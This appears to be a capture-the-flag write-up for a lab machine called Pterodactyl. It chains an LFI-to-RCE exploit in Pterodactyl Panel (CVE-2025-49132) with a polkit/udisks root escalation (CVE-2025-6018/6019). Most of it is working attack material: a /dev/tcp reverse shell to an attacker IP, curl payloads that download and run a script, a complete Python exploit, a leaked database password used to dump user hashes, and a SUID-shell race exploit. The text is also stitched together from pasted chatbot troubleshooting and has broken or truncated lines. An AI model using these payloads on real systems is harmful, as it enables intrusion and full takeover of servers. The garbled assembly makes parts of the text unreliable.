This is a comprehensive breakdown of the exploitation process for **CVE-2025-49132** on the Pterodactyl Panel. This vulnerability leverages a Local File Inclusion (LFI) in the localization component to achieve Remote Code Execution (RCE) via `pearcmd.php`.



# Writeup: Pterodactyl Panel RCE (CVE-2025-49132)

## 1. Enumeration & Reconnaissance

Initial port scanning reveals a standard web setup:

* **Port 22:** SSH
* **Port 80:** HTTP (Redirects to `pterodactyl.htb`)

### Subdomain Discovery

Using `ffuf` to enumerate subdomains, we identify a critical asset:

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt \
       -u http://pterodactyl.htb/ -H "Host: FUZZ.pterodactyl.htb" -fw 3

```

**Result:** `panel.pterodactyl.htb`

Further investigation of the panel reveals a `phpinfo.php` file, confirming that **PEAR** is installed and included in the PHP configuration. This is a significant finding, as it allows for `pearcmd` exploitation if LFI is present.



## 2. Vulnerability Analysis

The vulnerability, **CVE-2025-49132**, exists in the way the panel handles the `locale` and `namespace` parameters. By manipulating these, an attacker can include arbitrary files or leverage PHP's internal tools.

### The Attack Vector: `pearcmd.php`

The goal is to use the LFI to call `pearcmd.php` and use its `config-create` function to write a malicious PHP shell to the disk.



## 3. Exploitation Strategy

Because the browser URL-encodes special characters (like `<` and `?`), we must use `curl` or a Python script to send raw payloads. The exploitation follows a four-stage process:

### Stage 1: Preparation

Create a simple reverse shell script (`rev.sh`) and host it locally.

```bash
echo "bash -i >& /dev/tcp/10.10.16.46/4444 0>&1" > rev.sh
python3 -m http.server 8081

```

### Stage 2: Staging the Downloader

We inject a PHP payload into a new configuration file (`/tmp/shell.php`) that uses `curl` to fetch our `rev.sh` from our attack machine.

```bash
curl -v -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system('curl\${IFS}10.10.16.46:8081/rev.sh\${IFS}-o\${IFS}/tmp/rev.sh')?>+/tmp/shell.php"

```

### Stage 3: Triggering the Download

We call the newly created `/tmp/shell.php` via the LFI to execute the `curl` command.

```bash
curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell"

```

### Stage 4: Execution

Finally, we overwrite `/tmp/shell.php` with a command to execute the downloaded `rev.sh` and trigger it again while listening on port 4444.

```bash
# Overwrite with execution payload
curl -v -g "http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd&<?=system('sh\${IFS}/tmp/rev.sh')?>+/tmp/shell.php"

# Trigger execution
curl "http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../tmp&namespace=shell"

```


```Python
import requests
import time
import sys

#  CONFIGURATION 
TARGET = "http://panel.pterodactyl.htb"
ATTACKER_IP = "10.10.16.46"  # Your tun0 IP
HTTP_PORT = "8081"           # Port for python3 -m http.server
NC_PORT = "4444"             # Port for nc -lvnp
# 

def exploit():
    print(f"[*] Targeting: {TARGET}")
    print(f"[*] Ensure your HTTP server is on {HTTP_PORT} and Netcat on {NC_PORT}")

    # Stage 1: Write Downloader to /tmp/shell.php
    print("\n[*] Stage 1: Injecting downloader payload...")
    # Using URL-safe formatting for the PHP tags
    downloader = f"<?=system('curl${{IFS}}{ATTACKER_IP}:{HTTP_PORT}/rev.sh${{IFS}}-o${{IFS}}/tmp/rev.sh')?>"
    
    stage1_uri = (
        f"{TARGET}/locales/locale.json?+config-create+/"
        f"&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"
        f"&{downloader}+/tmp/shell.php"
    )
    
    try:
        requests.get(stage1_uri)
        print("[+] Downloader staged.")
    except Exception as e:
        print(f"[-] Error staging downloader: {e}")
        return

    # Stage 2: Trigger the Download
    print("[*] Stage 2: Triggering curl to fetch rev.sh...")
    trigger_uri = f"{TARGET}/locales/locale.json?locale=../../../../../tmp&namespace=shell"
    requests.get(trigger_uri)
    time.sleep(1) # Wait for the download to complete

    # Stage 3: Write Executor to /tmp/shell.php
    print("[*] Stage 3: Overwriting with execution payload...")
    executor = "<?=system('sh${IFS}/tmp/rev.sh')?>"
    
    stage3_uri = (
        f"{TARGET}/locales/locale.json?+config-create+/"
        f"&locale=../../../../../../usr/share/php/PEAR&namespace=pearcmd"
        f"&{executor}+/tmp/shell.php"
    )
    
    try:
        requests.get(stage3_uri)
        print("[+] Executor staged.")
    except Exception as e:
        print(f"[-] Error staging executor: {e}")
        return

    # Stage 4: Pop Shell
    print("[!] Stage 4: Triggering reverse shell... CHECK YOUR LISTENER!")
    try:
        # We use a small timeout because the request hangs once the shell is established
        requests.get(trigger_uri, timeout=5)
    except requests.exceptions.ReadTimeout:
        print("[+] Success! Request timed out (standard for a reverse shell).")
    except Exception as e:
        print(f"[-] Execution triggered, but encountered: {e}")

if __name__ == "__main__":
    exploit()
```



## 4. Post-Exploitation

After the final trigger, the reverse shell connects back to the listener:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.46] from (UNKNOWN) [10.xx.xx.xx] 54332
bash: no job control in this shell
www-data@pterodactyl:/var/www/html$ whoami
www-data
www-data@pterodactyl:/var/www/html$ cat /home/phileasfogg3/user.txt
[REDACTED_USER_FLAG]

```



This script will help downloading the helper script for reverse shell rev.sh to /tmp/rev.sh
Now we execute the script

$ cat /home/phileasfogg3/user.txt
<SNIP>
Root flag
Running env as user wwwrun in the current revshell, we got these fields:
DB_HOST=127.0.0.1
DB_PORT=3306
DB_PASSWORD=PteraPanel
DB_DATABASE=panel
DB_USERNAME=pterodactyl
With these stuff, let's dump every field from the database
$ mysql -h 127.0.0.1 -u pterodactyl -p'PteraPanel' --batch --skip-column-names
-e "SELECT id,username,email,root_admin,password FROM panel.users";"
(choped off for some reason)And now, we bruteforce the hash with hashcat (mode 3200)
And we login as phileasfogg3
ssh phileasfogg3@10.xx.xx.xx
Checking the os-release , we can see it's maybe vulnerable to CVE-2025-6018 and CVE-
2025-6019
Breaching

First up, we'll work with 6018 with this POC
https://github.com/dreysanox/CVE-2025-6018_Poc/blob/main/poc2025-6018.pyAnd now we have an allow_active session, let's keep going :)
For the second CVE, we're going to use this POC
https://github.com/guinea-offensive-security/CVE-2025-6019/blob/main/exploit.sh
First up, we install the utils on the host machine
$ sudo apt install xfs-utilsAnd we generate an xfs.image file

Manually getting root on Pterodactyl on non
debian-based distro
First exploit CVE-2025-6018:
attacker# ssh phileasfogg3@pterodactyl.htb
victim> gdbus call --system --dest org.freedesktop.login1 --object-
path /org/freedesktop/login1 --method
org.freedesktop.login1.Manager.CanReboot
('challenge',)
victim> { echo 'XDG_SEAT OVERRIDE=seat0'; echo 'XDG_VTNR
OVERRIDE=1'; } > .pam_environment
victim> exit
attacker# ssh phileasfogg3@pterodactyl.htb
victim> gdbus call --system --dest org.freedesktop.login1 --object-
path /org/freedesktop/login1 --method
org.freedesktop.login1.Manager.CanReboot
('yes',)
The output here should be ('yes',)
1/ On our own attacker machine, as root, we create an XFS image that
contains a SUID-root shell, and copy it to the victim machine.
HERE IT IS IMPORTANT TO EITHER SWITCH TO DEBIAN BASED DISTRO OR USE
DOCKER:docker run --rm -it --privileged -v $(pwd):/exploit -w /exploit
debian:latest bash
apt-get update && apt-get install -y xfsprogs
mkdir -p xfs.mount
mount -t xfs ./xfs.image ./xfs.mount
cp /bin/bash ./xfs.mount/
chmod 04555 ./xfs.mount/bash
ls -l ./xfs.mount/bash
umount ./xfs.mount


Check your system logs immediately. Run this command on your host (Kali) right after the failed mount attempt:

```bash
dmesg | tail

```

I suspect you will see a message like: **`XFS: V4 Filesystems not supported`** or **`Deprecated V4 format`**.

### **The Problem**

You are in a "Catch-22":

1. **The Target** (Pterodactyl) has an old kernel that **requires** XFS V4 (Legacy).
2. **Your Host** (Kali) has a new kernel that has **dropped support** for XFS V4.

Even though you successfully created the correct V4 image inside Docker, your host kernel refuses to mount it to let you copy the shell inside.



### **The Bypass: Build it ON the Target**

Since your host machine is the bottleneck, stop trying to build it there. You already have SSH access and the Polkit bypass (`CanReboot=yes`) on the victim machine. You can build and "weaponize" the image **directly on the target**.

**Follow these steps on the victim machine (`phileasfogg3@pterodactyl`):**

#### **1. Create the Image (Native Compatibility)**

Since you are using the target's own tools, the format will be perfectly compatible by definition.

```bash
# 1. Create the blank file in /tmp
dd if=/dev/zero of=/tmp/payload.img bs=1M count=20

# 2. Format it
# If mkfs.xfs is available, this will use the system's native defaults
mkfs.xfs /tmp/payload.img
# OR if that fails, try: /sbin/mkfs.xfs /tmp/payload.img

```

#### **2. Mount & Inject (Using your Polkit Access)**

Because you spoofed the session (CVE-2025-6018), `udisks2` should let you mount your own loop device as a standard user.

```bash
# 1. Setup Loop
udisksctl loop-setup -f /tmp/payload.img
# Note the device: e.g., /dev/loop0

# 2. Mount it (This mounts it to /media/phileasfogg3/...)
udisksctl mount -b /dev/loop0

# 3. Find the mount path
ls -la /media/phileasfogg3/
# Let's say it's /media/phileasfogg3/uuid-here

```

#### **3. Weaponize**

Even if `udisks` mounts it with `nosuid` (preventing execution), you can **write** the SUID bit to the file. It only needs to be executable during the race condition later (which mounts it elsewhere).

```bash
# 1. Copy bash
cp /bin/bash /media/phileasfogg3/<UUID>/bash

# 2. Set SUID (This sets the bit on the disk)
chmod 4755 /media/phileasfogg3/<UUID>/bash

# 3. Verify
ls -la /media/phileasfogg3/<UUID>/bash
# Should show: -rwsr-xr-x

```

#### **4. Unmount & Execute Race**

Now that the disk contains the trap, unmount it and trigger the race exploit.

```bash
# 1. Unmount
udisksctl unmount -b /dev/loop0

# 2. Start your "Busy" loop (The Monitor)
while true; do /tmp/blockdev*/bash -p && break; done 2>/dev/null &

# 3. Trigger the Resize (The Exploit)
gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'

```

**Why this works:**
You bypass the version mismatch entirely by using the victim's kernel to create and modify the filesystem. The `nosuid` mount option on step 2 doesn't matter because you aren't running the shell yet—you are just placing it there for the exploit to pick up in Step 4.


attacker# scp ./xfs.image phileasfogg3@pterodactyl.htb:
2/ We set up a loop device that is backed by our XFS image, but we first
make sure that "gvfs-udisks2-volume-monitor" is not running as our user
(otherwise it would automatically mount our XFS filesystem and prevent
the libblockdev from mounting it itself later):
victim> killall -KILL gvfs-udisks2-volume-monitor
victim> udisksctl loop-setup --file ./xfs.image --no-user-
interaction
Mapped file ./xfs.image as /dev/loop0.
3/ We request the udisks daemon to resize our XFS filesystem, which
forces the libblockdev to mount it in /tmp without the nosuid and nodev
flags, but we first run a tight loop that will keep our XFS filesystem
busy and prevent it from being unmounted later by the libblockdev:victim> while true; do /tmp/blockdev*/bash -c 'sleep 10; ls -l
/tmp/blockdev*/bash' && break; done 2>/dev/null &
victim> gdbus call --system --dest org.freedesktop.UDisks2 --
object-path /org/freedesktop/UDisks2/block_devices/loop0 --method
org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error
resizing filesystem on /dev/loop0: Failed to unmount '/dev/loop0'
after resizing it: target is busy
-r-sr-xr-x. 1 root root 1406608 May 13 09:42
/tmp/blockdev.RSM842/bash
4/ Finally, we execute our SUID-root shell (from our XFS filesystem in
/tmp) and therefore obtain full root privileges:
victim> mount
...
/dev/loop0 on /tmp/blockdev.RSM842 type xfs
(rw,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
victim> /tmp/blockdev*/bash -p
victim# id
uid=1002(phileasfogg3) gid=100(users) euid=0(root)
groups=100(users)
^^^^^^^^^^^^
victim# cat /root/root.txt
Using script for the final exploit after creating xfs image also works

Based on the error `bad format string -u--755` and the success of `d--777`, the issue is the **length** of your mode string.



. **Create the Valid Prototype:**
```bash
cat <<EOF > /tmp/root_proto.txt
dummy
0 0
d--755 0 0
bash -u-755 0 0 /bin/bash
$
EOF

```


. **Build & Verify:**
```bash
/sbin/mkfs.xfs -f -p /tmp/root_proto.txt /tmp/exploit.img

# Mount and check
udisksctl loop-setup -f /tmp/exploit.img
udisksctl mount -b /dev/loop5  
ls -la /run/media/phileasfogg3/*/bash

```



You should now see the sticky bit: `-rwsr-xr-x`. Once verified, you can proceed with the standard race condition steps.

This result `()` simply means the operation completed successfully 20 times in a row without you winning the race. The system mounted, resized, and unmounted the filesystem so quickly that your `while` loop in the top window didn't have a chance to grab it.

Since we know the exploit works (you got the "busy" error earlier), and we know the payload is correct (you verified the SUID bit), **you just need to be more aggressive.**

### **The "Infinite Hammer" Strategy**

Don't limit yourself to 20 tries. Run the trigger continuously until you force the error.

**1. Check your Session (Crucial)**
Before spamming, make sure your session didn't time out.

```bash
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
# MUST return ('yes',)

```

**2. Check the Loop Device**
Make sure `loop4` is still mapped.

```bash
udisksctl loop-setup -f /tmp/exploit.img
# If it maps to loop5, change the command below to loop5!

```

**3. The Infinite Trigger (Window 2)**
Run this command. It will fire the resize call endlessly.

```bash
while true; do 
    gdbus call --system --dest org.freedesktop.UDisks2 \
    --object-path /org/freedesktop/UDisks2/block_devices/loop5 \
    --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
done

```

**4. Watch Window 1**
Keep your eyes on the top window.

* **Wait for:** The loop to stop and a prompt to appear.
* **Once it pops:** Hitting `Ctrl+C` in Window 2 to stop the spam.

**5. Verify Root**
In Window 1, type:

```bash
id
# euid=0(root) -> Victory!

```

**Go!** The "target is busy" error in Window 2 is your signal that Window 1 has succeeded.

